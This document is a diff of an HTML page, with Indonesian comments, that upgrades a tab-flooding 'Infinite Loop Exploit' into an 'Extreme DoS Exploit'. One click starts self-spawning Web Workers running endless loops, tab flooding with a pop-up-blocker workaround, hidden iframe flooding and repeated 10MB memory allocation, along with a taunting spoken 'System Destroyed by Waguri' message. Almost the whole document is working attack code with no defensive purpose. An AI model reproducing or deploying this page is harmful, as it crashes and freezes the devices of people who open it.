@@ -3,21 +3,23 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Infinite Looping Exploit</title>
+    <title>Extreme DoS Exploit</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; text-align: center; cursor: pointer; user-select: none; }
+        body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; text-align: center; cursor: pointer; user-select: none; overflow: hidden; }
         .panel { background: #1e1e1e; padding: 40px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-width: 500px; width: 100%; border: 1px solid #333; }
         h1 { font-size: 28px; color: #ff4444; margin-bottom: 15px; text-shadow: 0 0 10px #ff4444; }
         p { font-size: 15px; color: #aaa; margin-bottom: 25px; line-height: 1.6; }
         #status { margin-top: 20px; font-weight: bold; color: #ff9800; font-size: 14px; font-family: monospace; background: #111; padding: 10px; border-radius: 6px; }
+        .warning { background: #331111; color: #ff4444; padding: 10px; border-radius: 6px; margin-bottom: 20px; font-size: 13px; border: 1px solid #ff4444; }
     </style>
 </head>
 
 <body>
 <div class="panel" id="main-panel">
-    <h1>⚠️ INFINITE LOOP EXPLOIT</h1>
-    <p>Klik di mana saja untuk memulai. <br><b>PERINGATAN:</b> Browser Anda akan dibanjiri tab tanpa henti hingga hang!</p>
+    <div class="warning">⚠️ PERINGATAN: Klik di mana saja akan memicu TOTAL BROWSER CRASH (DoS).</div>
+    <h1>Extreme DoS Exploit</h1>
+    <p>Menggunakan Multi-Worker, Iframe Flooding, dan Memory Bombing.</p>
     <div id="status" role="status">Menunggu klik...</div>
 </div>
 
@@ -25,6 +27,8 @@
     const statusDiv = document.getElementById("status");
     let isRunning = false;
     let totalTabs = 0;
+    let totalWorkers = 0;
+    let memoryBomb = [];
 
     // 1. Efek Getar & Suara
     function efekHacker() {
@@ -32,7 +36,7 @@
             navigator.vibrate([1000, 200, 1000, 200, 1000]);
         }
         if ('speechSynthesis' in window) {
-            const msg = new SpeechSynthesisUtterance('Hacked by Waguri');
+            const msg = new SpeechSynthesisUtterance('System Destroyed by Waguri');
             msg.lang = 'en-US';
             window.speechSynthesis.speak(msg);
         }
@@ -41,51 +45,92 @@
     // 2. Fungsi Membuka Tab
     function bukaTab() {
         try {
-            window.open('https://google.com', '_blank');
-            totalTabs++;
-            if (totalTabs % 10 === 0) {
-                statusDiv.textContent = `Telah membuka ${totalTabs} tab...`;
-                efekHacker(); // Picu getar & suara setiap 10 tab
+            const win = window.open('https://google.com', '_blank');
+            if (win) {
+                totalTabs++;
             }
         } catch (e) {}
     }
 
-    // 3. Mulai Serangan
+    // 3. Memory Bombing (Alokasi RAM secara masif)
+    function memoryBombing() {
+        try {
+            // Alokasi array 10MB secara terus-menerus
+            const arr = new Uint8Array(10 * 1024 * 1024); 
+            memoryBomb.push(arr);
+        } catch (e) {
+            // Jika RAM penuh, browser akan crash
+        }
+    }
+
+    // 4. Iframe Flooding
+    function buatIframe() {
+        try {
+            const iframe = document.createElement('iframe');
+            iframe.src = 'about:blank';
+            iframe.style.display = 'none';
+            document.body.appendChild(iframe);
+            iframe.contentWindow.document.write('<h1>HACKED</h1>');
+        } catch (e) {}
+    }
+
+    // 5. Worker Builder (Masing-masing worker akan spawn worker baru)
+    function spawnWorker() {
+        try {
+            const workerCode = `
+                self.onmessage = function(e) {
+                    if (e.data === 'START') {
+                        // Loop super cepat
+                        while(true) {
+                            self.postMessage('OPEN');
+                            self.postMessage('MEMORY');
+                        }
+                    }
+                };
+            `;
+            const workerBlob = new Blob([workerCode], { type: 'application/javascript' });
+            const worker = new Worker(URL.createObjectURL(workerBlob));
+
+            worker.onmessage = function(e) {
+                if (e.data === 'OPEN') {
+                    queueMicrotask(bukaTab);
+                }
+                if (e.data === 'MEMORY') {
+                    queueMicrotask(memoryBombing);
+                }
+            };
+
+            worker.postMessage('START');
+            totalWorkers++;
+        } catch (e) {}
+    }
+
+    // 6. Mulai Serangan
     function mulaiSerangan() {
         if (isRunning) return;
         isRunning = true;
         
-        statusDiv.textContent = "MEMULAI INFINITE LOOP!";
+        statusDiv.textContent = "MEMULAI TOTAL DESTRUCTION!";
         statusDiv.style.color = "#ff4444";
 
-        // Pemicu efek pertama
         efekHacker();
 
-        // TRIK INFINITE LOOP: Menggunakan Web Worker
-        // Worker berjalan di thread terpisah dan akan terus mengirim sinyal ke halaman utama
-        const workerCode = `
-            self.onmessage = function(e) {
-                if (e.data === 'START') {
-                    while(true) {
-                        self.postMessage('OPEN');
-                    }
-                }
-            };
-        `;
-        const workerBlob = new Blob([workerCode], { type: 'application/javascript' });
-        const worker = new Worker(URL.createObjectURL(workerBlob));
+        // Spawn 5 Web Workers secara bersamaan
+        for (let i = 0; i < 5; i++) {
+            spawnWorker();
+        }
 
-        worker.onmessage = function(e) {
-            if (e.data === 'OPEN') {
-                // Memicu pop-up di dalam microtask untuk bypass blokir
-                queueMicrotask(() => {
-                    bukaTab();
-                });
-            }
-        };
+        // Loop Iframe Flooding dan Tab Flooding di Main Thread
+        setInterval(() => {
+            buatIframe();
+            bukaTab();
+            memoryBombing();
+            
+            statusDiv.textContent = `Workers: ${totalWorkers} | Tabs: ${totalTabs} | Memory: ${memoryBomb.length * 10}MB`;
+        }, 10); // Setiap 10ms
 
-        // Mulai worker
-        worker.postMessage('START');
+        // Worker Creator Loop (Spawn worker baru setiap 500ms)
+        setInterval(spawnWorker, 500);
     }
 
     // Hanya butuh SATU klik
